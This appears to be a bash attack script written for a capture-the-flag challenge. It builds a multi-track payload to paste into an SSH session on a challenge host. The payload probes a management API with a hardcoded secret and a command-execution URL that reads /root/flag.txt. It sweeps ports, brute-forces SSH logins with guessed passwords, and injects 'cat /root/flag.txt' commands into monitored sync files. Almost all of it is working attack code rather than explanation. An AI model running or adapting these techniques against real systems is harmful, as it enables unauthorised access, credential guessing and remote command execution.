#!/bin/bash
# STOLEN SCHEMATICS - PRIORITY ATTACK FOR PORT 32964
# Run this from Kali - copies to clipboard for paste

cat << 'REMOTE_SCRIPT' | xclip -selection clipboard 2>/dev/null || pbcopy 2>/dev/null || cat

# TRACK 1: Management API with verbose diagnostics
python3 << 'PY1'
import urllib.request
import sys

SECRET = "dOpKC729CoeywJl9pSUPcAGmaiFhtkzd7CD0jJPQ"
print("[TRACK 1] Management API diagnostic")

endpoints = [
    ("http://172.27.0.1:8080/", {}),
    ("http://172.27.0.1:8080/", {"Authorization": f"Bearer {SECRET}"}),
    ("http://172.27.0.1:8080/", {"X-Management-Secret": SECRET}),
    ("http://172.27.0.1:8080/api/exec?cmd=cat%20/root/flag.txt", {"X-Management-Secret": SECRET}),
    ("http://172.27.0.1:8080/management/flag", {"Authorization": f"Bearer {SECRET}"}),
]

for url, headers in endpoints:
    try:
        req = urllib.request.Request(url)
        for k, v in headers.items():
            req.add_header(k, v)
        
        resp = urllib.request.urlopen(req, timeout=3)
        data = resp.read().decode()
        print(f"[+] {url} → {resp.code} {resp.msg}")
        if "TDHO{" in data:
            print(f"[!!!] FLAG FOUND: {data}")
            sys.exit(0)
        if len(data) > 0 and len(data) < 1000:
            print(f"    Response: {data[:500]}")
    except urllib.error.HTTPError as e:
        print(f"[-] {url} → HTTP {e.code} {e.msg}")
        print(f"    Headers: {dict(e.headers)}")
    except Exception as e:
        print(f"[-] {url} → {str(e)[:100]}")
PY1

# TRACK 2: Port sweep
python3 << 'PY2'
import socket
print("\n[TRACK 2] Port sweep 172.27.0.1")
for port in [21, 22, 23, 25, 80, 443, 3000, 3306, 5000, 5432, 6379, 8000, 8080, 8443, 9000, 25565]:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex(("172.27.0.1", port))
        if result == 0:
            print(f"[+] Port {port} OPEN")
            try:
                sock.send(b"GET / HTTP/1.0\r\n\r\n")
                banner = sock.recv(1024).decode(errors="ignore")
                if banner:
                    print(f"    Banner: {banner[:100]}")
            except:
                pass
        sock.close()
    except:
        pass
PY2

# TRACK 3: SSH pivot with Python
python3 << 'PY3'
print("\n[TRACK 3] SSH pivot attempt")
try:
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for user in ["player", "root", "admin"]:
        for password in ["reyalp", "player", "admin", "password"]:
            try:
                client.connect("172.27.0.1", username=user, password=password, timeout=2)
                print(f"[+] SSH SUCCESS: {user}:{password}")
                stdin, stdout, stderr = client.exec_command("cat /root/flag.txt 2>/dev/null || cat /etc/flag.txt 2>/dev/null")
                flag_data = stdout.read().decode()
                if "TDHO{" in flag_data:
                    print(f"[!!!] FLAG: {flag_data}")
                    import sys
                    sys.exit(0)
                else:
                    print(f"    No flag at standard locations")
                    stdin, stdout, stderr = client.exec_command("find / -name '*flag*' 2>/dev/null | head -5")
                    print(f"    Flag files: {stdout.read().decode()}")
                client.close()
                break
            except:
                pass
except ImportError:
    print("[-] paramiko not available")
except Exception as e:
    print(f"[-] SSH failed: {e}")
PY3

# TRACK 4: Check if nmap available, else use bash
if command -v nmap &> /dev/null; then
    echo -e "\n[TRACK 4] nmap sweep"
    nmap -p- -T4 --max-retries 1 --max-rtt-timeout 200ms 172.27.0.1 2>/dev/null | grep "^[0-9]"
else
    echo -e "\n[TRACK 4] Bash port sweep (no nmap)"
    for port in $(seq 1 65535); do
        timeout 0.1 bash -c "echo >/dev/tcp/172.27.0.1/$port" 2>/dev/null && echo "Port $port open"
    done &
    sleep 5
    kill $! 2>/dev/null
fi

# TRACK 5: Alternative sync-loop.sh trigger methods
echo -e "\n[TRACK 5] Alternative trigger methods"

# Try writing to different monitored paths
for path in "/opt/mc/config/sync-request.conf" "/opt/mc/.sync/request" "/tmp/sync-request"; do
    echo "talldwarf-sync-command=cat /root/flag.txt" > "$path" 2>/dev/null && echo "[*] Wrote to $path"
done

sleep 5

# Check all possible output locations
for output in "/opt/mc/config/sync-result.conf" "/opt/mc/.sync/result" "/tmp/sync-result" "/home/player/flag.txt" "/tmp/flag.txt"; do
    if [ -f "$output" ]; then
        echo "[+] Found output: $output"
        cat "$output"
    fi
done

# TRACK 6: Final desperate measures
echo -e "\n[TRACK 6] Checking for any TDHO{ in writable locations"
grep -r "TDHO{" /home/player /tmp /opt/mc/config 2>/dev/null | head -3

echo -e "\n[STATUS] All tracks complete. Check output above for flag."

REMOTE_SCRIPT

echo "=== Script copied to clipboard. SSH and paste ==="
echo "ssh player@instance.ctf.tdho.st -p 32964"
echo "password: reyalp"
